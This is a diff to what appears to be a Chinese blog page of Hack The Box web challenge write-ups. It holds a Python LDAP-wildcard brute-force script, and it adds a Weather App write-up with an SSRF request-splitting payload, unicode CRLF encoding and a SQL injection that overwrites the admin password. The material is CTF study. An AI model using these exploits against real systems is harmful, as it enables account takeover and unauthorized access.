@@ -29,8 +29,13 @@
 <meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221101204400213.png">
 <meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221102205727322.png">
 <meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221102205806706.png">
+<meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221229123403100.png">
+<meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221229123548852.png">
+<meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221229123746859.png">
+<meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221229123922496.png">
+<meta property="og:image" content="http://sovohelp.fit/2022/11/01/web/image-20221229124221332.png">
 <meta property="article:published_time" content="2022-11-01T12:05:52.000Z">
-<meta property="article:modified_time" content="2022-12-12T05:55:32.429Z">
+<meta property="article:modified_time" content="2022-12-29T04:57:48.443Z">
 <meta property="article:author" content="sovo">
 <meta property="article:tag" content="LDAP">
 <meta name="twitter:card" content="summary_large_image">
@@ -256,7 +261,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          3.9k 字
         
       </span>
     
@@ -267,7 +272,7 @@
         
         
         
-          18 分钟
+          33 分钟
         
       </span>
     
@@ -337,11 +342,38 @@
 <p>通配符*登陆</p>
 <img src="/2022/11/01/web/image-20221102205806706.png" srcset="/img/loading.gif" lazyload class="" title="image-20221102205806706">
 
-<p>经过测试Reese，*也可以登陆那么现在要找flag了，search搜不到，IDAP注入是无法类似SQL直接查数据的，但是，上述的博客中存在，多次测试</p>
+<p>经过测试Reese，*也可以登陆那么现在要找flag了，search搜不到，LDAP注入是无法类似SQL直接查数据的，但是，上述的博客中存在，多次测试</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>*<br>f*<br>f1*<br></code></pre></td></tr></table></figure>
 
 <p>按照这个思路，我们猜测Reese的密码就是flag那么根据flag格式有密码为HTB{*}形式的猜测，进行测试发现这个密码确实能登陆那么下面就好办了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>header = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&quot;</span><br>&#125;<br>url = <span class="hljs-string">&quot;http://178.62.87.44:32207/login&quot;</span><br><br><span class="hljs-comment"># 测试字符集</span><br>chars = string.ascii_letters<br>chars += <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>])<br><br>counter = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&quot;HTB&#123;&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 所有字符都测试了，说明找到了flag</span><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-built_in">len</span>(chars):<br>        <span class="hljs-built_in">print</span>(flag+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    password = flag + chars[counter]+<span class="hljs-string">&#x27;*&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Trying&quot;</span> + password)<br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;Reese&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : password&#125;<br>    response = requests.post(url= url,headers=header,data=data)<br><br>    <span class="hljs-keyword">if</span> response.url != url+<span class="hljs-string">&quot;?message=Authentication%20failed&quot;</span>:<br>        flag += chars[counter]<br>        counter = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        counter += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Weather-App"><a href="#Weather-App" class="headerlink" title="Weather App"></a>Weather App</h3><p>首先下载附件，审计源码。</p>
+<p><strong><img src="/2022/11/01/web/image-20221229123403100.png" srcset="/img/loading.gif" lazyload class="" title="image-20221229123403100"></strong></p>
+<p>可以看到在使用admin登陆时，会将flag返回</p>
+<p>尝试登陆，密码不知道。</p>
+<p>查看其它路由</p>
+<img src="/2022/11/01/web/image-20221229123548852.png" srcset="/img/loading.gif" lazyload class="" title="image-20221229123548852">
+
+<p>发现，有注册功能，但是，这里仅接受来自本地的请求，查看其它位置有没有利用的地方。</p>
+<p>返现对&#x2F;api&#x2F;weather的请求中存在http请求</p>
+<img src="/2022/11/01/web/image-20221229123746859.png" srcset="/img/loading.gif" lazyload class="" title="image-20221229123746859">
+
+<p>这里需要激发额外的http请求</p>
+<img src="/2022/11/01/web/image-20221229123922496.png" srcset="/img/loading.gif" lazyload class="" title="image-20221229123922496">
+
+<p>node8对http模块很容易<a target="_blank" rel="noopener" href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">通过Request Splitting</a>受到<a target="_blank" rel="noopener" href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">SSRF的</a>攻击。</p>
+<p>这里找到了攻击入口，尝试构造payload</p>
+<img src="/2022/11/01/web/image-20221229124221332.png" srcset="/img/loading.gif" lazyload class="" title="image-20221229124221332">
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">CONFLICT</span>(username) <span class="hljs-keyword">DO</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-comment">--+&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+<p>所以构造如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=admin&amp;password=1234&#x27;) ON CONFLICT(username) <span class="hljs-keyword">DO</span> UPDATE <span class="hljs-built_in">SET</span> password = <span class="hljs-string">&#x27;admin&#x27;</span>;--<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><br><span class="language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>29</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-routeros"><span class="hljs-attribute">username</span>=admin&amp;password=1234&#x27;) ON CONFLICT(username) <span class="hljs-keyword">DO</span> UPDATE <span class="hljs-built_in">SET</span> password = <span class="hljs-string">&#x27;admin&#x27;</span>;--</span></span><br><span class="language-routeros"><span class="language-http"></span></span><br><span class="language-routeros"><span class="language-http"><span class="hljs-built_in">GET</span> / HTTP/1.1</span></span><br><span class="language-routeros"><span class="language-http">Host: 127.0.0.1</span></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://167.172.55.94:30182&quot;</span><br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&#x27;1234\&#x27;) ON CONFLICT(username) DO UPDATE SET password = \&#x27;admin\&#x27;;--&#x27;</span><br>PARSEusername = username.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;\u0120&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;%27&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;%22&quot;</span>)<br>PARSEpassword = password.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;\u0120&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;%27&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;%22&quot;</span>)<br>contentLength = <span class="hljs-built_in">len</span>(PARSEusername)+<span class="hljs-built_in">len</span>(PARSEpassword)+<span class="hljs-number">19</span><br>endpoint = <span class="hljs-string">&#x27;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120&#x27;</span> + <span class="hljs-built_in">str</span>(contentLength) + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010Ausername=&#x27;</span> + PARSEusername + <span class="hljs-string">&#x27;&amp;password=&#x27;</span> + PARSEpassword + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010AGET\u0120/?lol=&#x27;</span><br>r = requests.post(url + <span class="hljs-string">&#x27;/api/weather&#x27;</span>, json=&#123;<span class="hljs-string">&#x27;endpoint&#x27;</span>: endpoint, <span class="hljs-string">&#x27;city&#x27;</span>: <span class="hljs-string">&#x27;chengdu&#x27;</span>, <span class="hljs-string">&#x27;country&#x27;</span>: <span class="hljs-string">&#x27;CN&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure>
 
 
                 
